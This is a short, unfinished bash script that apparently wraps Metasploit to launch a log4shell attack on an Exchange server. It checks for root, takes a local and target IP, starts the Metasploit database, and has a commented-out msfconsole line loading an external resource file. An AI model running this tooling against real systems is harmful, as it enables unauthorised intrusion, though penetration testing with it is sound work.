#!/bin/bash

echo "*** UNDER DEVELOPMENT! ***"

# Check if the user is running the script with root privileges
if [ "$EUID" -ne 0 ]
then
  echo "Please run as root"
  exit
fi

# Check if the required number of arguments was provided
if [ $# -lt 2 ]
then
  echo " "
  echo "Syntax: log4shell.sh 'localhost ip' 'exchange server ip'" 
  echo "Example: ./log4shell.sh 10.10.10.10 10.10.10.20"
  echo " "
    exit
fi

echo "Starting MSF and running msfscripts/log4shell.rc"
msfdb start
# msfconsole -q -x "setg LHOST $1; setg RHOSTS $2;resource ./msfscripts/log4shell.rc"